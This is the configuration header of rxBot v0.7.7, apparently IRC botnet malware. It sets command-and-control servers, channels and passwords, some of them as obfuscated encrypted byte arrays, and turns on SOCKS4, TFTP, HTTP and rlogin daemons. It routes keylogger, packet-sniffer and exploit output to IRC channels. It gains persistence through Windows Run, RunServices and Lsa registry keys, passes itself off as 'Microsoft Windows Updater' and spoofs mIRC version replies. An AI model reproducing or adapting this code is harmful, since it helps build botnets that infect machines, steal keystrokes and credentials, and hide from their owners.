//

// bot configuration (generic) - doesn't need to be encrypted
int port = 31375;				// server port
int port2 = 6667;				// backup server port
int socks4port = 29675;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '!';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!
//PKBOT
char botid[]={116,103,-54,20,73,0};
char version[]={127,94,-126,102,20,-106,-9,39,-83,34,72,-124,24,36,-1,-125,-30,0};
char password[]={98,84,-106,82,54,-127,-82,55,-6,61,78,-100,79,0};
char server[]={73,77,-112,77,24,-52,-74,96,-81,63,13,-50,93,96,-36,-69,-37,-117,98,-61,-54,-72,-21,105,-82,58,-74,0};
char serverpass[]={0};
char channel[]={7,95,-97,71,14,-112,-78,0};
char chanpass[]={64,73,-101,80,19,0};
char server2[]={64,66,-128,74,23,-112,-75,127,-6,126,27,-49,69,116,-58,-91,-49,-63,104,-62,-39,0};
char channel2[]={7,95,-97,71,14,-112,-78,0};
char chanpass2[]={64,73,-101,80,19,0};
char filename[]={83,69,-108,23,73,-111,-71,53,-77,105,6,-49,0};
char keylogfile[]={80,73,-105,84,23,-52,-93,41,-23,0};
char valuename[]={115,69,-108,23,73,-62,-124,62,-24,98,26,-118,109,107,-63,-82,-42,-120,0};
char nickconst[]={127,126,-94,121,7,0};
char szLocalPayloadFile[]={83,69,-108,23,73,-121,-81,33,-15,99,12,-49,0};
char modeonconn[]={15,69,0};
char exploitchan[]={7,95,-97,71,14,-112,-78,0};
char keylogchan[]={7,95,-97,71,14,-112,-78,0};
char psniffchan[]={7,95,-97,71,14,-112,-78,0};
char authost1[]={14,108,-106,75,24,-125,-69,57,-14,127,10,-124,74,97,0};
char authost2[]={14,65,-101,78,18,-127,-3,17,-73,0};
char *authost[]={authost1,authost2};
char versionlist1[]={73,101,-88,103,91,-108,-31,127,-83,63,94,-31,70,101,-61,-83,-37,-49,75,-58,-33,-70,-19,42,-32,23,-66,-120,0};
char versionlist2[]={73,101,-88,103,91,-108,-31,127,-84,60,94,-31,70,101,-61,-83,-37,-49,75,-58,-33,-70,-19,42,-32,23,-66,-120,0};
char versionlist3[]={73,101,-88,103,91,-108,-31,127,-84,62,94,-31,70,101,-61,-83,-37,-49,75,-58,-33,-70,-19,42,-32,23,-66,-120,0};
char versionlist4[]={73,101,-88,103,91,-108,-31,127,-84,56,94,-31,70,101,-61,-83,-37,-49,75,-58,-33,-70,-19,42,-32,23,-66,-120,0};
char *versionlist[]={versionlist1,versionlist2,versionlist3,versionlist4};
char regkey1[]={119,67,-100,80,12,-125,-91,52,-63,65,23,-55,92,107,-36,-89,-39,-101,90,-16,-60,-80,-24,40,-70,38,-121,-78,-115,99,99,-7,-104,-85,-30,-71,-127,-21,-102,-71,30,-107,-100,68,90,0};
char regkey2[]={119,67,-100,80,12,-125,-91,52,-63,65,23,-55,92,107,-36,-89,-39,-101,90,-16,-60,-80,-24,40,-70,38,-121,-78,-115,99,99,-7,-104,-85,-30,-71,-127,-21,-102,-71,30,-107,-100,68,90,-101,15,-12,-117,-110,50,-43,116,0};
char regkey3[]={119,67,-100,80,12,-125,-91,52,-63,65,23,-55,92,107,-36,-89,-39,-101,90,-24,-31,-101,0};
char regkey4[]={119,117,-87,112,62,-81,-117,18,-24,126,12,-49,64,112,-20,-89,-47,-101,116,-56,-63,-115,-23,51,-111,22,-76,-97,-116,99,126,-16,-86,-109,-57,-67,0};


#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "NsSass";						// bot id
char version[] = "[rxBot v0.7.7 Sass]";		// Bots !version reply
char password[] = "mypass";					// bot password
char server[] = "yourserv.org";		// server
char serverpass[] = "";						// server password
char channel[] = "#NsrXßðt";				// channel that the bot should join
char chanpass[] = "NðKrXSass";						// channel password
char server2[] = "yourserv2.org";						// backup server (optional)
char channel2[] = "#NsrXßðt";						// backup channel (optional)
char chanpass2[] = "NðKrXSass";						// backup channel password (optional)
char filename[] = "WINUPDATE.EXE";			// destination file name
char keylogfile[] = "keys.txt";				// keylog filename
char valuename[] = "Microsoft Windows Updater";		// value name for autostart
char nickconst[] = "NsSass";					// first part to the bot's nick
char szLocalPayloadFile[]="win.dat";	// Payload filename
char modeonconn[] = "+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#NsrXßðt";					// Channel where exploit messages get redirected
char keylogchan[] = "#rXLSass";						// Channel where keylog messages get redirected
char psniffchan[] = "#rXLSass";	

char *authost[] = {
	"*@*"
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "a1s2d3f4g5h6j7k"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

